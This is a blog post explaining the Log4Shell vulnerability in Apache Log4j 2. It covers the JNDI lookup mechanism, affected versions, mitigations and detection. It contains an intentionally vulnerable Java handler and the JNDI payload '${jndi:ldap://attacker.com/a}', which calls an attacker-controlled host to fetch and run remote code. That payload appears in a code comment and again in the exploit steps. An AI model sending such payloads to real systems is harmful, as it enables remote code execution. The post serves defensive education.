---
layout: post
title:  "Log4J Remote Code Execution"
date:   2021-12-10 19:56:00 +0800
author: allencharp
tags: [web-security, log4j, rce]
---

# Reference

[Log4Shell — CVE-2021-44228 analysis](https://www.lunasec.io/docs/blog/log4j-zero-day/)

# Introduction

Log4Shell (CVE-2021-44228) is one of the most severe vulnerabilities ever found in Java: a remote code execution in Apache Log4j 2, one of the most widely used logging libraries. Because Log4j logs attacker-controlled strings (user agents, headers, usernames, ...) by default, a single crafted input is enough to trigger the bug on any affected application.

# Vulnerability mechanism

Log4j 2 supports **lookups** in log messages: placeholders like `${env:HOME}` or `${jndi:ldap://...}` are resolved at runtime. The `${jndi:...}` lookup passes the URL to Java's JNDI (Java Naming and Directory Interface). JNDI can load remote objects over **LDAP** (and other protocols); an attacker-controlled LDAP server can return a reference to a remote Java class, which the JVM fetches and executes — giving the attacker **arbitrary code execution** in the target's JVM.

# Affected Apache log4j versions

* Vulnerable: `2.0 <= Apache log4j <= 2.14.1`
* Fixed: 2.15.0 (first fix, incomplete), **2.17.1** (complete fix of related CVEs CVE-2021-45046, CVE-2021-45105)

# Sample vulnerable code

The following pseudo-code logs an attacker-controlled HTTP header — the classic trigger:

```java
import java.io.*;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(VulnerableLog4jExampleHandler.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * This is basically pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    String userAgent = he.getRequestHeader("user-agent");

    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
    log.info("Request User Agent:" + userAgent);

    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

# Exploit steps

* Data from the user gets sent to the server (via any protocol),
* The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where attacker.com is an attacker-controlled server),
* The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via "Java Naming and Directory Interface" (JNDI),
* The response contains a path to a remote Java class file (e.g. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
* The injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

# Mitigation

* **Upgrade** to Log4j 2.17.1+ (or 2.12.4 for the 2.12 line); for Log4j 1.x, migrate to 2.x.
* If upgrading is not immediately possible, set the system property `log4j2.formatMsgNoLookups=true` or remove the JndiLookup class.
* Restrict **outbound network access** from application servers (block LDAP/RMI/HTTP egress to the internet), which breaks the JNDI callback even on vulnerable versions.
* If you run an older JVM, also consider the JDK mitigation properties (`com.sun.jndi.ldap.object.trustURLCodebase=false` is default since 8u191, which limits — but does not fully prevent — exploitation).
* **Detect**: scan dependencies for log4j-core versions, and test endpoints by sending a canary payload like `${jndi:ldap://<your-id>.<dnslog-domain>/a}` to a DNS-logging service.

# Scan tool

[log4j-scanner](https://github.com/cisagov/log4j-scanner)

# Summary

Log4Shell shows how a "harmless" logging feature (JNDI lookups in log messages) becomes a full RCE when combined with attacker-controlled log input. The fix is both simple (upgrade) and hard (finding every affected jar in the ecosystem) — which is why it remains one of the best case studies in software supply chain security.
